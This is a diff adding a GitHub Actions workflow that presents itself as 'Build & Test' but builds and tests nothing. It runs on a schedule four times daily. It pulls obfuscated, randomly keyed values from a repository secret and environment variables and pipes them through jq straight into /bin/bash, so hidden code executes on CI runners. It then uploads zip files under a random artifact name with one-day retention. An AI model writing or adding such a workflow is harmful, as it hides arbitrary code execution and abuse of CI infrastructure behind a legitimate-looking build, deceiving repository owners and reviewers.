@@ -1,0 +1,35 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          sury49: ${{ secrets.sury49 }}
+        run: |
+          printf '%s' "$sury49" | jq -r .yiy48401 | /bin/bash
+          printf '%s' "$m81747" | jq -r .hm32 | /bin/bash
+          echo $j535 | jq -r .rtjt3 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 73FOBI7e
+          path: "*.zip"
+          retention-days: 1
